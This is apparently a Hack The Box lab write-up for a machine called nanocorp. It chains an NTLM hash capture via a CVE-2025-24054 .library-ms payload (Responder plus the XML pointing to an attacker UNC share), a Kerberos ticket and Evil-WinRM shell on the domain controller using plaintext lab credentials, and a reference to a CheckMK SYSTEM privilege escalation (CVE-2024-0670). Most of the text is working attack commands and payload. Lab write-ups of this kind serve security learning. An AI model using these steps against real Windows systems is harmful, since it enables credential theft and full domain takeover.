CVE-2025-24054
NTLM Hash Disclosure via .library-ms File — Windows 10/11
STEP 03
How The Exploit Works
VULNERABILITY SUMMARY Windows renders .library-ms XML files (Windows Library format) and follows <url> tags to resolve network share icons/logos — without validating whether the path is reachable. When it tries to access a UNC path (e.g. \\10.10.17.39\shared), it authenticates via SMB using the current user's NTLMv2 hash. A fake SMB server (Responder) catches the authentication attempt and captures the hash.

Step 1 — Start Responder
BASH — KALI (run first)
sudo responder -I tun0
Keep this running before uploading the exploit. Responder will host a fake SMB server on your tun0 (HTB VPN) interface and intercept authentication attempts.
Step 2 — Generate the .library-ms Payload (Python PoC)
EXPLOIT SCRIPT Use the Python script from ExploitDB (Beatriz Fresno Naumova). It creates a ZIP containing a .library-ms XML file pointing at your IP. The XML structure uses Windows' searchConnectorDescription to point to your fake UNC share.
BASH — Generate exploit ZIP
python3 exploit.py --file resume --target <YOUR_TUN0_IP> --zip exploit.zip
Replace <YOUR_TUN0_IP> with your Kali tun0 IP (check with ip a show tun0). The generated XML will point UNC path to \\YOUR_IP\shared.
GENERATED .library-ms XML CONTENT
<?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <searchConnectorDescriptionList> <searchConnectorDescription> <simpleLocation> <url>\\<YOUR_IP>\shared</url> </simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription>

KERBEROS + EVIL-WINRM
TGT-based auth bypasses the password reset race condition.
STEP 08
🔑 WHY KERBEROS INSTEAD OF PASSWORD
Using evil-winrm -p (password auth) against port 5986 fails with an authorization error AND triggers the lab to reset monitoring_svc's password. To avoid this race condition, obtain a TGT via kinit, export it, and use Evil-WinRM with the cached ticket instead.
Step 1 — Generate krb5.conf
BASH — Auto-generate Kerberos config
nxc smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --generate-krb5-file krb5.conf
Generates a proper krb5.conf so Kali knows the KDC location, realm, and DNS mappings for nanocorp.htb. Place it at /etc/krb5.conf or export KRB5_CONFIG=./krb5.conf.
BASH
sudo cp krb5.conf /etc/krb5.conf
Step 2 — Obtain TGT via kinit
BASH — Request TGT (immediately after BloodyAD!)
kinit monitoring_svc@NANOCORP.HTB # Enter password when prompted: Pa$$word123!
The realm NANOCORP.HTB must be uppercase. This writes a TGT to the Kerberos credential cache. Verify with klist.
Step 3 — Export Ticket & Get Shell
BASH — Export TGT
export KRB5CCNAME=/tmp/krb5cc_1000
BASH — Evil-WinRM with Kerberos ticket
evil-winrm -i dc01.nanocorp.htb \ -r NANOCORP.HTB \ -u monitoring_svc \ -K /tmp/krb5cc_1000 \ -S -P 5986
-r NANOCORP.HTB Kerberos realm  ·  -K path to TGT cache  ·  -S SSL  ·  -P 5986 non-default WinRM port

CVE-2024-0670 — CHECKM K PRIVESC
MSI repair race condition → NT AUTHORITY\SYSTEM
STEP 10
Vulnerability Overview
CVE-2024-0670 — CheckMK Windows Agent Local Privilege Escalation The CheckMK MSI repair system uses files from C:\Windows\Temp — which is writable by all users but not listable. By placing a malicious script in that directory before the MSI repair process runs, we can hijack execution context and achieve SYSTEM-level code execution.
KEY CONSTRAINTS C:\Windows\Temp: writable by all users, but not listable (no dir command works). You can write and execute files there but can't browse. The exploit must be triggered as web_svc, not monitoring_svc — web_svc has the necessary rights.
EXPLOIT REPO Full methodology + scripts available at: github.com/elsevar11/CVE-2024-0670-CheckMK-Agent-Local-Privilege-Escalation-Exploit

Clock Sync — Critical for HTB
CLOCK SKEW IS THE #1 KERBEROS KILLER Kerberos tickets expire or fail if your system clock differs from the DC by more than 5 minutes. HTB machines are often 6–7 hours off from Kali's default time. Always sync before using Kerberos.
BASH — Sync time with DC
sudo ntpdate <TARGET_IP> # Or: sudo timedatectl set-ntp false sudo date -s "$(curl -s --head http://nanocorp.htb | grep Date | sed 's/Date: //')"
BASH — Verify skew
date # Compare with: nxc smb nanocorp.htb | grep start_date
Kerberos Quick Checklist for This Lab
✓ /etc/hosts has dc01.nanocorp.htb pointing to TARGET_IP Kerberos resolves KDCs by hostname, not IP. Missing this = "Cannot contact KDC" error.
✓ Realm name is UPPERCASE in all commands: NANOCORP.HTB Case-sensitive. NANOCORP.HTB ≠ nanocorp.htb in kinit and evil-winrm -r.
✓ System time synced with DC before kinit 5-minute tolerance. HTB DC01 has ~7h skew from default Kali. Sync first.
✓ Do kinit IMMEDIATELY after BloodyAD password change The lab resets monitoring_svc's password on Evil-WinRM auth failure. Get the TGT before attempting any WinRM connection.
✓ Use -K (ticket path) with evil-winrm, NOT -p (password) Password auth triggers the lab reset. Ticket auth doesn't. This is the key difference.
✓ Port 5986 with -S flag — non-standard SSL WinRM Default evil-winrm uses 5985. This DC uses 5986 with SSL. Missing -S or -P 5986 = connection timeout.
